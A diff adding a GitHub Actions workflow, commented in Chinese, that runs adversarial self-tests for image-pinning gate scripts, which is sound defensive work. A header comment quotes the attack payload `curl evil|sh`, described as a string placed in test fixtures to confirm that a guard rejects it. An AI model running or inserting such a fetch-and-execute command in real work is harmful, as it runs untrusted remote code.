@@ -1,0 +1,107 @@
+# verify-gate-selftests —— 守门脚本的**对抗性自测**
+#
+# ★为什么需要这个 workflow：
+#   `scripts/image-pin/` 下有 5 个 .test.sh，共约 750 行，专门验证
+#   `verify-image-pin.sh` / `check-pr-shape.sh` / `verify-runner-topology.sh`
+#   在各种绕过尝试下**确实 fail-closed**。其中
+#   `verify-image-pin-envbind.test.sh` 的 case (6) 复刻的正是一个曾被
+#   Codex 复现出来的**生产 bypass**。
+#
+#   但截至 2026-08-01，这 5 个套件**没有任何 workflow 调用**（实测
+#   `grep -rl <name> .github/workflows/` 全部为 0）。也就是说：
+#   required check `verify-image-pin` 的正确性依赖那几个脚本，
+#   而证明脚本正确的回归检测**从不运行** —— 一次重构把 bypass 改回来，
+#   照样绿灯合并。
+#
+#   本仓已经在 `verify-image-pin.yml:55-59` 记过同类教训
+#   （verify-cip-sync.sh「存在但零 workflow 调用」→「守门脚本没接线 =
+#   那些声称全是空头承诺」）。当时只把结论应用到了脚本本身，
+#   没有应用到证明脚本的测试套件。本 workflow 补上这一半。
+#
+# 运行成本：5 个套件本地实测合计约 30s，全部**离线**（不联网、不需要凭据）。
+#   套件里出现的 `curl evil|sh` 是**攻击载荷字符串**，写进临时 fixture 用来
+#   验证 render-guard 会拒绝它，不是真的发起网络请求。
+#
+# 触发：每个 PR 与 main push 都跑。不加 paths 过滤——守门脚本的行为可能被
+#   任何改动间接影响（例如 allowed-images schema、kustomization 结构），
+#   只在 scripts/ 变更时跑会漏掉这些。
+name: verify-gate-selftests
+
+on:
+  pull_request:
+  push:
+    branches: [main]
+
+permissions:
+  contents: read
+
+concurrency:
+  group: verify-gate-selftests-${{ github.event.pull_request.number || github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  selftest:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@v6
+        with:
+          persist-credentials: false
+
+      # 与 verify-image-pin.yml 保持同一版本与校验方式（避免两处行为漂移）
+      - name: Install yq (pinned + checksum)
+        run: |
+          set -euo pipefail
+          YQ_VER=v4.44.3
+          YQ_SHA=a2c097180dd884a8d50c956ee16a9cec070f30a7947cf4ebf87d5f36213e9ed7
+          curl -fsSL -o /tmp/yq "https://github.com/mikefarah/yq/releases/download/${YQ_VER}/yq_linux_amd64"
+          echo "${YQ_SHA}  /tmp/yq" | sha256sum -c - || { echo "::error::yq checksum 校验失败"; exit 1; }
+          chmod +x /tmp/yq
+          sudo mv /tmp/yq /usr/local/bin/yq
+          yq --version
+
+      # ubuntu-latest 自带 kustomize 与 jq；显式断言避免"缺工具导致套件静默跳过"
+      - name: Assert toolchain present
+        run: |
+          set -euo pipefail
+          for t in yq jq kustomize; do
+            command -v "$t" >/dev/null || { echo "::error::缺少 $t"; exit 1; }
+          done
+          echo "工具链就绪"
+
+      # ★逐个跑并汇总，而不是 `for ... || exit`：
+      #   一次跑完能看到**全部**失败的套件，避免"修一个跑一次"的往返。
+      - name: Run gate self-tests
+        run: |
+          set -uo pipefail
+          shopt -s nullglob
+          tests=(scripts/image-pin/*.test.sh)
+          if [ "${#tests[@]}" -eq 0 ]; then
+            echo "::error::未找到任何 .test.sh —— 套件被删除或路径变更，本 gate 形同虚设"
+            exit 1
+          fi
+
+          failed=()
+          for t in "${tests[@]}"; do
+            echo "::group::$t"
+            if bash "$t"; then
+              echo "✅ $(basename "$t")"
+            else
+              echo "❌ $(basename "$t")"
+              failed+=("$(basename "$t")")
+            fi
+            echo "::endgroup::"
+          done
+
+          {
+            echo "### 守门脚本自测"
+            echo ""
+            echo "共 ${#tests[@]} 个套件，失败 ${#failed[@]} 个。"
+            for f in "${failed[@]}"; do echo "- ❌ $f"; done
+          } >> "$GITHUB_STEP_SUMMARY"
+
+          if [ "${#failed[@]}" -ne 0 ]; then
+            echo "::error::${#failed[@]} 个守门自测失败：${failed[*]}"
+            exit 1
+          fi
+          echo "全部 ${#tests[@]} 个套件通过"
